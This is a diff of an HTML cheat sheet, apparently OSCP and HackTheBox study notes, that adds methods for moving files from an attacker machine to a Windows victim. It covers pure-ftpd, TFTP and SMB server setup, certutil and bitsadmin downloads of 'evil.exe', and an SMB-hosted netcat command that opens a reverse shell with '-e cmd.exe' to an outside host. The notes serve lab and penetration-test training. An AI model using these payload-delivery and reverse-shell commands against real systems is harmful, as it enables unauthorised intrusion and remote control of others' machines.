@@ -7,13 +7,35 @@
 </head>
 <body>
 <h1>
-  Transferring Files to Windows
+  Transferring Files to Windows - PayloadsAllTheThings - oscp pre notes
 </h1><br>
+<h3>HTTP server with python</h3>
+<pre>
+  python3 -m http.server 8080
+  (or)
+  python2 -m SimpleHTTPServer 8080
+</pre>
+
+
 <h3>FTP</h3>
 <pre>
+#in attacker machine
+apt-get update && apt-get install pure-ftpd -y
+groupadd ftpgroup
+useradd -g ftpgroup -d /dev/null -s /etc ftpuser
+pure-pw useradd ftp -u ftpuser -d ~/hackthebox/tools
+pure-pw mkdb
+cd /etc/pure-ftpd/auth/
+ln -s ../conf/PureDB 60pdb
+mkdir -p ~/hackthebox/tools
+chown -R ftpuser:ftpgroup ~/hackthebox/tools
+
+/etc/init.d/pure-ftpd restart
+
+#in victim machine
   echo open 192.168.1.101 21> ftp.txt
-  echo USER asshat>> ftp.txt
-  echo mysecretpassword>> ftp.txt
+  echo USER ftpuser>> ftp.txt
+  echo mypassword>> ftp.txt
   echo bin>> ftp.txt
   echo GET wget.exe>> ftp.txt
   echo bye>> ftp.txt
@@ -26,7 +48,7 @@
 <pre>
 #Kali TFTP setup
 
-  atftpd --daemon --port 69 /tftp
+  atftpd --daemon --port 69 ~/hackthebox/tools
   /etc/init.d/atftpd restart
 
 #Now you can put stuff in /srv/tftp and it will be served. Remember that TFTP used UDP. So if you run netstat it will not show it as listening.
@@ -36,14 +58,12 @@
 
 #So now you can upload and download whatever from the windows-machine like this
 
-  tftp -i 192.160.1.101 GET wget.exe
-#If you like to test that the tftp-server is working you can test it from Linux, I don't think it has a non-interactive way.
-
-  tftp 192.160.1.101
-  GET test.txt
-#I usually put all files I want to make available in /srv/tftp
-#If you want to make sure that the file was uploaded correct you can check in the syslog. Grep for the IP like this:
-
+  tftp -i 10.10.14.17 GET wget.exe
+#Download
+  tftp -i 10.10.14.17 GET test.txt
+#Upload
+  tftp -i 10.10.14.17 PUT nc.exe
+#check in the syslog. Grep for the IP like this:
   grep 192.168.1.101 /var/log/syslog
 </pre>
 <hr>
@@ -123,5 +143,27 @@ certutil.exe -urlcache -split -f http://192.168.189.131:7777/evil.exe evil.exe
 <pre>
 bitsadmin /transfer evil /download /priority high http://192.168.189.131:9995/evil.exe %temp%\evil.exe
 </pre>
+<hr>
+<h3>SMB</h3>
+<pre>
+##In attacker machine
+python /usr/share/doc/python-impacket/examples/smbserver.py SHARE ~/hackthebox/tools
+
+##victim machine
+
+#show list
+net view \\10.10.14.17
+#viewing available file
+dir \\10.10.14.17\SHARE
+#download file
+copy \\10.10.14.17\SHARE\nc.exe .
+#upload file
+copy nc2.exe \\10.10.14.17\SHARE\nc2.exe
+#run script without download
+\\10.10.14.17\SHARE\nc.exe -nv 10.10.14.17 4444 -e cmd.exe
+
+</pre>
+
+<hr>
 </body>
 </html>
